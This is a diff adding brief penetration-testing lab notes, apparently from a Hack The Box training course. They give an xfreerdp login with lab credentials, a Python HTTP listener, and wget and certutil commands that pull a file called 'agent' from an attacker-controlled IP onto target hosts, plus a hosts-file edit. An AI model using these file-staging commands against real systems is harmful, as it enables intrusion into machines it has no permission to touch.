@@ -1,0 +1,20 @@
+1 xfreerdp
+2 python listener
+3 add to hosts file
+
+## 1 xfreerdp
+  #The Domain, Drive, and Dynamic Resolution flags are not required
+  xfreerdp /v:10.10.10.132 /u:administrator /p:'Password1' /d:inlanefreight.local /drive:linux,/home/htb-student /dynamic-resolution
+
+## 2 python listener and common connection cmds
+  File = 'agent' (can use extension eg. agent.exe)
+  
+  1 Listener on pwnbox
+    `python3 -m http.server 8000`
+  2 wget on linux host
+    `wget http://10.10.14.209:8000/agent`
+  3 Or Powershell on Windows host
+    `certutil -urlcache -split -f "http://10.10.14.209:8000/agent" c:\windows\temp\agent`
+
+## 3 Add url to hosts file
+  sudo sh -c 'echo "10.129.85.254 ftp.internal.inlanefreight.htb" >> /etc/hosts/'
